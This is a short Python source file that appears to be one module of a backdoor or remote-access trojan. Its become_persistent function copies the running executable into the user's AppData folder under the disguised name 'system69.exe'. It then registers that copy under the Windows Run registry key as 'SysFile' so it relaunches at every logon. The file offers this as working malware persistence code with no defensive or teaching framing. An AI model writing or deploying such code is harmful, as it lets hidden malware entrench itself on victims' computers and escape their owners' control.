import sys
import os
import shutil
import importlib

# need to check this as im writing this in linux and winreg is windows specific
winreg_exists = importlib.util.find_spec('winreg')
if winreg_exists:
    import winreg


def become_persistent(my_socket):
    print("[+] Becoming persistent by adding Registry eys to startup programs")
    # copy the current exec to some dir
    # appdata

    curr_exec = sys.executable

    # copy this exe to appdata dir
    app_data = os.getenv("APPDATA")
    to_save_file = app_data + "\\"+"system69.exe"

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_exec, to_save_file)

        # update sys reg keys
        key = winreg.HKEY_CURRENT_USER

        # "software\Microsoft\Windows\CurrentVersion\Run"

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_object = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_object, "SysFile", 0,
                          winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_object)
